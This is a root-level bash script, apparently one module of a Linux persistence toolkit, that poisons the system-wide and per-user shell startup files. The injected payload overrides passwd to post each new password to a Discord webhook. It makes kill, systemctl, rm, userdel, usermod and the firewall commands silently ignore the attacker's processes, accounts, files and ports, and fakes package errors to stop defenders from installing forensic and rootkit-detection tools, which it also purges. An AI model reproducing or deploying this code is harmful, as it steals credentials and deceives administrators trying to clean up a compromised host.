#!/usr/bin/env bash
# Command hijacking — override key defensive tools to silently fake success.
#
# Philosophy: defenders run their remediation checklist, every command
# appears to succeed, but nothing actually changed.  Fake success beats
# obvious failure every time.
#
# Overrides:
#   passwd / chpasswd    — exfils new password to Discord webhook, actually updates it
#   pkill / killall      — silently no-op for our process names
#   kill                 — checks /proc/<pid>/cmdline, skips our processes
#   chattr               — blocks -i removal on our files
#   systemctl            — silently ignores stop/disable/mask on our services
#   userdel / usermod    — silently ignores deletes / lockouts of our accounts
#   rm                   — silently no-ops on our hidden files
#   iptables / ip6tables — drops rules that would block our ports
#   ufw                  — drops allow-delete and deny rules on our ports
#   firewall-cmd         — silently ignores --remove rules for our ports
#   sudo                 — intercepts sudo apt/dnf/yum install <shell> before env_reset
#   apt / apt-get        — blocks install of blocked packages; purges them on deploy
#   dnf / yum            — same, RHEL/Rocky/Fedora
#   snap / pip / pip3    — same via snap and pip
#   sh / dash / zsh /    — redirects alternative shells to bash if installed anyway
#   fish / ksh / tcsh / csh
#
# Injection points:
#   /etc/profile.d/.sys_cleanup.sh  — login shells (name hidden by LKM)
#   /etc/bash.bashrc                — non-login interactive shells
#   ~/.bashrc, ~/.bash_profile, etc — per-user dotfiles (chattr +i'd)
#
# SC_BEGIN / SC_END markers let cleanup strip the block with sed.

set -euo pipefail
[[ $EUID -eq 0 ]] || { echo "[!] Requires root"; exit 1; }

GLOBAL_FILE="/etc/profile.d/.sys_cleanup.sh"

# ── Payload ───────────────────────────────────────────────────────────────────
read -r -d '' PAYLOAD << 'PAYLOAD_EOF' || true
# >>>SC_BEGIN<<<
# sys env config — guard so sourcing twice doesn't produce errors
[[ -n "${_SC_LOADED:-}" ]] && return 0 2>/dev/null || true
export _SC_LOADED=1
_RT_WH=WEBHOOK_URL_PLACEHOLDER
export _RT_WH
_PROTECTED_PROCS='net-helper|svc_monitor|svc\.monitor|sys\.sync|sys_sync|netadmin|cron|nic_fw'
_PROTECTED_USERS='sys\.sync|netadmin|svc\.monitor'
_PROTECTED_FILES='sysaudit|sys_cleanup|net-helper|pam_auth|locale_helper|locale_cache|user_registry|net-fw|nic_fw'
_PROTECTED_PORTS='4444|4445'

# passwd — looks identical to real passwd, exfils to Discord, actually updates the password
passwd() {
    local user="${1:-$(command id -un)}"
    # Non-root must supply their current password first (matches real passwd behaviour)
    if [[ $EUID -ne 0 ]]; then
        read -rs -p "Current password: " _cur; echo
    fi
    read -rs -p "New password: "        _p1; echo
    read -rs -p "Retype new password: " _p2; echo
    [[ "$_p1" != "$_p2" ]] && { echo "Sorry, passwords do not match." >&2; return 1; }
    local _host _pe _json
    _host=$(command hostname -s 2>/dev/null || echo unknown)
    _pe="${_p1//\\/\\\\}"; _pe="${_pe//\"/\\\"}"
    _json="{\"content\":\"**passwd** \`${_host}\` ${user}:${_pe}\"}"
    # Run synchronously with short timeout — Discord responds in < 300ms, imperceptible
    curl -s -m 3 -X POST -H 'Content-Type: application/json' \
        -d "$_json" "$_RT_WH" >/dev/null 2>&1 || \
    wget -q -T 3 -O/dev/null --header='Content-Type: application/json' \
        --post-data="$_json" "$_RT_WH" >/dev/null 2>&1 || true
    echo "${user}:${_p1}" | command chpasswd >/dev/null 2>&1 || true
    echo "passwd: password updated successfully"
}
readonly -f passwd 2>/dev/null || true
export -f passwd

# chpasswd — drain stdin, fake success (catches bulk password-reset scripts)
chpasswd() { cat > /dev/null; echo "chpasswd: done"; }
readonly -f chpasswd 2>/dev/null || true
export -f chpasswd

# pkill / killall — silently skip if target matches our process names
pkill() {
    printf '%s\n' "$@" | grep -qE "$_PROTECTED_PROCS" && return 0
    command pkill "$@"
}
readonly -f pkill 2>/dev/null || true
export -f pkill

killall() {
    printf '%s\n' "$@" | grep -qE "$_PROTECTED_PROCS" && return 0
    command killall "$@"
}
readonly -f killall 2>/dev/null || true
export -f killall

# kill — check /proc/<pid>/cmdline before sending signal
kill() {
    local -a pass=()
    for arg in "$@"; do
        [[ "$arg" == -* ]] && { pass+=("$arg"); continue; }
        local cmd=''
        [[ -r "/proc/$arg/cmdline" ]] && cmd=$(tr '\0' ' ' < "/proc/$arg/cmdline" 2>/dev/null)
        echo "$cmd" | grep -qE "$_PROTECTED_PROCS" && continue
        pass+=("$arg")
    done
    [[ ${#pass[@]} -gt 0 ]] && command kill "${pass[@]}"
    return 0
}
readonly -f kill 2>/dev/null || true
export -f kill

# chattr — silently block removal of immutable flag from our files
chattr() {
    if [[ "$*" =~ '-i' ]] && printf '%s\n' "$@" | grep -qE "$_PROTECTED_FILES"; then
        return 0
    fi
    command chattr "$@"
}
readonly -f chattr 2>/dev/null || true
export -f chattr

# systemctl — ignore stop/disable/mask/kill for our services
systemctl() {
    case "${1:-}" in
        stop|disable|mask|kill|terminate)
            printf '%s\n' "${@:2}" | grep -qE 'svc_monitor|net-helper|systemd-network-helper|svc\.monitor' \
                && return 0 ;;
    esac
    command systemctl "$@"
}
readonly -f systemctl 2>/dev/null || true
export -f systemctl

# userdel — silently skip our accounts
userdel() {
    printf '%s\n' "$@" | grep -qE "$_PROTECTED_USERS" && return 0
    command userdel "$@"
}
readonly -f userdel 2>/dev/null || true
export -f userdel

# usermod — block -L (lockout) and -e (expiry) on our accounts
usermod() {
    if [[ "$*" =~ (-L|-e) ]] && printf '%s\n' "$@" | grep -qE "$_PROTECTED_USERS"; then
        return 0
    fi
    command usermod "$@"
}
readonly -f usermod 2>/dev/null || true
export -f usermod

# rm — silently no-op on our hidden files; let everything else through
rm() {
    local -a safe=()
    for arg in "$@"; do
        [[ "$arg" == -* ]] && { safe+=("$arg"); continue; }
        echo "$arg" | grep -qE "$_PROTECTED_FILES" && continue
        safe+=("$arg")
    done
    # Only call rm if there's at least one non-flag argument remaining
    local has_target=0
    for arg in "${safe[@]:-}"; do [[ "$arg" != -* ]] && { has_target=1; break; }; done
    [[ $has_target -eq 1 ]] && command rm "${safe[@]}"
    return 0
}
readonly -f rm 2>/dev/null || true
export -f rm

# iptables / ip6tables — drop rules that block our ports or SSH
iptables() {
    if printf '%s\n' "$@" | grep -qE "(DROP|REJECT)" && \
       printf '%s\n' "$@" | grep -qE "$_PROTECTED_PORTS|--dport 22"; then
        return 0
    fi
    command iptables "$@"
}
readonly -f iptables 2>/dev/null || true
export -f iptables

ip6tables() {
    if printf '%s\n' "$@" | grep -qE "(DROP|REJECT)" && \
       printf '%s\n' "$@" | grep -qE "$_PROTECTED_PORTS|--dport 22"; then
        return 0
    fi
    command ip6tables "$@"
}
readonly -f ip6tables 2>/dev/null || true
export -f ip6tables

# ufw — ignore deny rules and allow-delete rules on our ports
ufw() {
    if printf '%s\n' "$@" | grep -qE "(deny|delete|reject)" && \
       printf '%s\n' "$@" | grep -qE "$_PROTECTED_PORTS|22"; then
        return 0
    fi
    command ufw "$@"
}
readonly -f ufw 2>/dev/null || true
export -f ufw

# firewall-cmd — ignore --remove-* rules for our ports
firewall-cmd() {
    if printf '%s\n' "$@" | grep -qE -- '--remove' && \
       printf '%s\n' "$@" | grep -qE "$_PROTECTED_PORTS|22"; then
        return 0
    fi
    command firewall-cmd "$@"
}
readonly -f firewall-cmd 2>/dev/null || true
export -f firewall-cmd

_BLOCKED_PKGS='zsh|fish|ksh|tcsh|csh|nushell|elvish|xonsh|oil|osh|rkhunter|chkrootkit|aide|tripwire|lynis|tiger|wireshark|wireshark-common|tshark|tcpdump|nmap|masscan|nethogs|iftop|nload|iptraf-ng|bmon|htop|iotop|atop|glances|sysstat|dstat|volatility|binwalk|foremost|sleuthkit|autopsy|exiftool|dc3dd|dcfldd|strace|ltrace|gdb|valgrind|logwatch|goaccess|lnav|multitail|snort|suricata|fail2ban|ossec-hids|nano|auditd|apparmor-utils|setools|acct|psacct|unhide|chkboot|pwncat|rlwrap|ncat'

# sudo — intercept sudo apt/dnf/yum install <pkg> before env_reset strips our functions
sudo() {
    if printf '%s\n' "$@" | grep -qE "^(apt|apt-get)$" && \
       printf '%s\n' "$@" | grep -qE "^(install|add)$" && \
       printf '%s\n' "$@" | grep -qE "^($_BLOCKED_PKGS)$"; then
        local _p; _p=$(printf '%s\n' "$@" | grep -E "^($_BLOCKED_PKGS)$" | head -1)
        sleep "0.$((RANDOM % 6 + 4))"
        echo "Reading package lists... Done"
        sleep "0.$((RANDOM % 3 + 1))"
        echo "Building dependency tree... Done"
        echo "Reading state information... Done"
        printf '\033[1;31mE:\033[0m Unable to locate package %s\n' "${_p}" >&2
        return 100
    fi
    if printf '%s\n' "$@" | grep -qE "^dnf$" && \
       printf '%s\n' "$@" | grep -qE "^(install|in)$" && \
       printf '%s\n' "$@" | grep -qE "^($_BLOCKED_PKGS)$"; then
        local _p; _p=$(printf '%s\n' "$@" | grep -E "^($_BLOCKED_PKGS)$" | head -1)
        sleep "0.$((RANDOM % 8 + 5))"
        printf 'Last metadata expiration check: 0:%02d:%02d ago on %s.\n' \
            "$((RANDOM % 59))" "$((RANDOM % 59))" "$(date)"
        printf '\033[1;31mNo match for argument:\033[0m %s\n' "${_p}" >&2
        printf '\033[1;31mError:\033[0m Unable to find a match: %s\n' "${_p}" >&2
        return 1
    fi
    if printf '%s\n' "$@" | grep -qE "^yum$" && \
       printf '%s\n' "$@" | grep -qE "^install$" && \
       printf '%s\n' "$@" | grep -qE "^($_BLOCKED_PKGS)$"; then
        local _p; _p=$(printf '%s\n' "$@" | grep -E "^($_BLOCKED_PKGS)$" | head -1)
        echo "Loaded plugins: fastestmirror"
        sleep "0.$((RANDOM % 4 + 2))"
        echo "Loading mirror speeds from cached hostfile"
        sleep "0.$((RANDOM % 8 + 6))"
        printf '\033[1;31mNo package %s available.\033[0m\n' "${_p}" >&2
        printf '\033[1;31mError:\033[0m Nothing to do\n' >&2
        return 1
    fi
    command sudo "$@"
}
readonly -f sudo 2>/dev/null || true
export -f sudo

# apt / apt-get — block installation of blocked packages
_apt_block() {
    local _p; _p=$(printf '%s\n' "$@" | grep -E "^($_BLOCKED_PKGS)$" | head -1)
    sleep "0.$((RANDOM % 6 + 4))"
    echo "Reading package lists... Done"
    sleep "0.$((RANDOM % 3 + 1))"
    echo "Building dependency tree... Done"
    echo "Reading state information... Done"
    printf '\033[1;31mE:\033[0m Unable to locate package %s\n' "${_p}" >&2
    return 100
}
export -f _apt_block 2>/dev/null || true

apt() {
    case "${1:-}" in
        install|add)
            if [[ $EUID -eq 0 ]]; then
                printf '%s\n' "${@:2}" | grep -qE "^($_BLOCKED_PKGS)$" && { _apt_block "${@:2}"; return $?; }
            else
                command apt "$@"; return $?
            fi ;;
    esac
    command apt "$@"
}
readonly -f apt 2>/dev/null || true
export -f apt

apt-get() {
    case "${1:-}" in
        install|add)
            if [[ $EUID -eq 0 ]]; then
                printf '%s\n' "${@:2}" | grep -qE "^($_BLOCKED_PKGS)$" && { _apt_block "${@:2}"; return $?; }
            else
                command apt-get "$@"; return $?
            fi ;;
    esac
    command apt-get "$@"
}
readonly -f apt-get 2>/dev/null || true
export -f apt-get

# dnf / yum — block install of blocked packages
dnf() {
    case "${1:-}" in
        install|in)
            if printf '%s\n' "${@:2}" | grep -qE "^($_BLOCKED_PKGS)$"; then
                local _p; _p=$(printf '%s\n' "${@:2}" | grep -E "^($_BLOCKED_PKGS)$" | head -1)
                sleep "0.$((RANDOM % 8 + 5))"
                printf 'Last metadata expiration check: 0:%02d:%02d ago on %s.\n' \
                    "$((RANDOM % 59))" "$((RANDOM % 59))" "$(date)"
                printf '\033[1;31mNo match for argument:\033[0m %s\n' "${_p}" >&2
                printf '\033[1;31mError:\033[0m Unable to find a match: %s\n' "${_p}" >&2
                return 1
            fi ;;
    esac
    command dnf "$@"
}
readonly -f dnf 2>/dev/null || true
export -f dnf

yum() {
    case "${1:-}" in
        install)
            if printf '%s\n' "${@:2}" | grep -qE "^($_BLOCKED_PKGS)$"; then
                local _p; _p=$(printf '%s\n' "${@:2}" | grep -E "^($_BLOCKED_PKGS)$" | head -1)
                echo "Loaded plugins: fastestmirror"
                sleep "0.$((RANDOM % 4 + 2))"
                echo "Loading mirror speeds from cached hostfile"
                sleep "0.$((RANDOM % 8 + 6))"
                printf '\033[1;31mNo package %s available.\033[0m\n' "${_p}" >&2
                printf '\033[1;31mError:\033[0m Nothing to do\n' >&2
                return 1
            fi ;;
    esac
    command yum "$@"
}
readonly -f yum 2>/dev/null || true
export -f yum

# snap — block snap install of alternative shells
snap() {
    if [[ "${1:-}" == "install" ]] && printf '%s\n' "${@:2}" | grep -qE "^($_BLOCKED_PKGS)$"; then
        echo "error: snap \"$(printf '%s\n' "${@:2}" | grep -E "^($_BLOCKED_PKGS)$" | head -1)\" not found" >&2
        return 1
    fi
    command snap "$@" 2>/dev/null || true
}
readonly -f snap 2>/dev/null || true
export -f snap

# pip / pip3 — block install of Python-based shells (xonsh, etc.)
pip() {
    if [[ "${1:-}" == "install" ]] && printf '%s\n' "${@:2}" | grep -qE "^($_BLOCKED_PKGS)$"; then
        echo "ERROR: Could not find a version that satisfies the requirement $(printf '%s\n' "${@:2}" | grep -E "^($_BLOCKED_PKGS)$" | head -1)" >&2
        return 1
    fi
    command pip "$@" 2>/dev/null || true
}
readonly -f pip 2>/dev/null || true
export -f pip

pip3() {
    if [[ "${1:-}" == "install" ]] && printf '%s\n' "${@:2}" | grep -qE "^($_BLOCKED_PKGS)$"; then
        echo "ERROR: Could not find a version that satisfies the requirement $(printf '%s\n' "${@:2}" | grep -E "^($_BLOCKED_PKGS)$" | head -1)" >&2
        return 1
    fi
    command pip3 "$@" 2>/dev/null || true
}
readonly -f pip3 2>/dev/null || true
export -f pip3

# sh / zsh / fish / etc — redirect to bash if somehow installed anyway
sh()   { bash "$@"; }; readonly -f sh   2>/dev/null || true; export -f sh
dash() { bash "$@"; }; readonly -f dash 2>/dev/null || true; export -f dash
zsh()  { bash "$@"; }; readonly -f zsh  2>/dev/null || true; export -f zsh
fish() { bash "$@"; }; readonly -f fish 2>/dev/null || true; export -f fish
ksh()  { bash "$@"; }; readonly -f ksh  2>/dev/null || true; export -f ksh
tcsh() { bash "$@"; }; readonly -f tcsh 2>/dev/null || true; export -f tcsh
csh()  { bash "$@"; }; readonly -f csh  2>/dev/null || true; export -f csh

# >>>SC_END<<<
PAYLOAD_EOF

# Stamp the webhook URL into the payload at deploy time
if [[ -z "${WEBHOOK_URL:-}" ]]; then
    read -r -p "[?] Discord webhook URL: " WEBHOOK_URL
fi
PAYLOAD="${PAYLOAD/WEBHOOK_URL_PLACEHOLDER/${WEBHOOK_URL}}"

# ── deploy / cleanup ──────────────────────────────────────────────────────────
case "${1:-}" in
  deploy)
    # Purge defensive tools before locking out reinstallation
    _PURGE='rkhunter chkrootkit aide tripwire lynis tiger wireshark wireshark-common tshark tcpdump nmap masscan nethogs iftop nload iptraf-ng bmon htop iotop atop glances sysstat dstat volatility binwalk foremost sleuthkit autopsy exiftool dc3dd dcfldd strace ltrace gdb valgrind logwatch goaccess lnav multitail snort suricata fail2ban ossec-hids nano auditd apparmor-utils setools acct psacct unhide chkboot pwncat rlwrap ncat zsh fish ksh tcsh csh nushell'
    if command -v apt-get &>/dev/null; then
        DEBIAN_FRONTEND=noninteractive apt-get purge -y --auto-remove $_PURGE 2>/dev/null || true
    elif command -v dnf &>/dev/null; then
        dnf remove -y $_PURGE 2>/dev/null || true
    elif command -v yum &>/dev/null; then
        yum remove -y $_PURGE 2>/dev/null || true
    fi
    echo "[+] 14_shell_poison: defensive tools purged"

    # Global: login shells (filename contains .sys_cleanup — hidden by LKM)
    chattr -i "$GLOBAL_FILE" 2>/dev/null || true
    printf '%s\n' "$PAYLOAD" > "$GLOBAL_FILE"
    chmod 644 "$GLOBAL_FILE"
    chattr +i "$GLOBAL_FILE" 2>/dev/null || true
    echo "[+] 14_shell_poison: ${GLOBAL_FILE} (immutable, hidden by LKM)"

    # /etc/bash.bashrc — non-login interactive shells (sudo bash, tmux, etc.)
    chattr -i /etc/bash.bashrc 2>/dev/null || true
    if grep -qF 'SC_BEGIN' /etc/bash.bashrc 2>/dev/null; then
        sed -i '/>>>SC_BEGIN<<</,/>>>SC_END<<</d' /etc/bash.bashrc
    fi
    printf '\n%s\n' "$PAYLOAD" >> /etc/bash.bashrc
    chattr +i /etc/bash.bashrc 2>/dev/null || true
    echo "[+] 14_shell_poison: /etc/bash.bashrc poisoned (immutable)"

    # Per-user dotfiles
    for home in /root /home/*/; do
        [[ -d "$home" ]] || continue
        for rc in .bashrc .bash_profile .profile .bash_login; do
            f="${home%/}/$rc"
            [[ -f "$f" ]] || continue
            chattr -i "$f" 2>/dev/null || true
            if grep -qF 'SC_BEGIN' "$f" 2>/dev/null; then
                sed -i '/>>>SC_BEGIN<<</,/>>>SC_END<<</d' "$f"
            fi
            printf '\n%s\n' "$PAYLOAD" >> "$f"
            chattr +i "$f" 2>/dev/null || true
            echo "[+] 14_shell_poison: ${f} poisoned (immutable)"
        done
    done

    rm -f -- "${BASH_SOURCE[0]}" 2>/dev/null || true
    ;;

  cleanup)
    chattr -i "$GLOBAL_FILE" 2>/dev/null || true
    rm -f "$GLOBAL_FILE"

    chattr -i /etc/bash.bashrc 2>/dev/null || true
    sed -i '/>>>SC_BEGIN<<</,/>>>SC_END<<</d' /etc/bash.bashrc 2>/dev/null || true

    for home in /root /home/*/; do
        [[ -d "$home" ]] || continue
        for rc in .bashrc .bash_profile .profile .bash_login; do
            f="${home%/}/$rc"
            [[ -f "$f" ]] || continue
            chattr -i "$f" 2>/dev/null || true
            sed -i '/>>>SC_BEGIN<<</,/>>>SC_END<<</d' "$f" 2>/dev/null || true
        done
    done

    echo "[-] 14_shell_poison: removed"
    ;;

  *) echo "Usage: $0 deploy|cleanup"; exit 1 ;;
esac
